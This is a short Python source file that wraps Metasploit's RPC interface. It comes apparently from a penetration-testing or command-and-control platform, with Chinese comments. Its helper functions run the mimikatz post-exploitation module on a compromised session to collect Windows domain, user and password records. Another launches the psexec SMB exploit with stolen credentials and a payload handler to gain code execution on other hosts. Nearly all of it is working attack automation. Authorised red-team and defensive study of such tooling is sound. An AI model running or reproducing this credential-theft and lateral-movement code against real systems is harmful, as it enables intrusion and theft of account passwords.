# -*- coding: utf-8 -*-
# @File  : msfmodule.py
# @Date  : 2019/3/15
# @Desc  :


import json

from Lib.log import logger
from Lib.method import Method
from Lib.rpcclient import RpcClient


class MsfModule(object):
    """msf模块类"""

    def __init__(self):
        pass

    @staticmethod
    def run_with_output(module_type, mname, opts, _timeout=180):
        """实时运行,获取输出"""
        params = [module_type,
                  mname,
                  opts,
                  False,
                  _timeout]
        result = RpcClient.call(Method.ModuleExecute, params)
        return result

    @staticmethod
    def run_as_job(module_type, mname, opts, ):
        """后台任务方式运行"""
        params = [module_type,
                  mname,
                  opts,
                  True,
                  5]
        result = RpcClient.call(Method.ModuleExecute, params)
        return result


class MsfModuleAsFunction(object):
    """集成常见的MSF模块,将其封装成函数"""

    def __init__(self):
        pass

    @staticmethod
    def _set_payload_by_handler(opts=None, handler=None):
        if opts is None:
            opts = {}
        if handler is None:
            handler = {}

        """通过handler参数设置msf模块的payload,必须输入一个dict类型变量"""
        z = opts.copy()
        z.update(handler)

        z['disablepayloadhandler'] = True
        return z

    @staticmethod
    def get_windows_password(sessionid):
        module_type = "post"
        mname = "windows/gather/credentials/mimikatz"
        opts = {'SESSION': sessionid}
        output = MsfModule.run_with_output(module_type, mname, opts)
        try:
            result = json.loads(output)
        except Exception as E:
            logger.exception(E)
            result = {'status': False}
        credential_list = []
        if result.get('status') is True:
            data = result.get('data')
            if isinstance(data, list):
                for record in data:
                    if record.get('password') == '' or record.get('password').find('n.a.') >= 0:
                        continue
                    credential_list.append(
                        {'domain': record.get('domain'), 'user': record.get('user'),
                         'password': record.get('password')})
        return credential_list

    @staticmethod
    def psexec_exploit(rhosts, smbdomain, smbuser, smbpass, handler):
        """handler为字典类型"""
        module_type = "exploit"
        mname = "windows/smb/psexec"
        opts = {'RHOSTS': rhosts, 'SMBDomain': smbdomain, 'SMBUser': smbuser, 'SMBPass': smbpass}
        opts = MsfModuleAsFunction._set_payload_by_handler(opts, handler)
        output = MsfModule.run_as_job(module_type, mname, opts)
        return output
